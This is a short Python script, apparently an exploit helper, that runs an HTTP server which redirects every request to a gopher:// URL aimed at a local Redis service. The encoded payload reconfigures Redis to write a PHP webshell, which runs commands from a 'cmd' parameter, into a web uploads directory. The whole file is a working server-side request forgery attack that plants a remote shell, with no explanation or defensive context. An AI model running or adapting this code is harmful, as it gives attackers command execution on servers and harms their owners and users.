import SimpleHTTPServer
import SocketServer

class FakeRedirect(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        new_path = 'gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html/uploads%0D%0ACONFIG%20SET%20dbfilename%20webshell2.php%0D%0ASET%20webshell2%20%22%3C%3Fphp%20echo%20exec%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%0D%0ASAVE'
        self.send_header('Location', new_path)
        self.end_headers()

SocketServer.TCPServer(("", 8080), FakeRedirect).serve_forever()
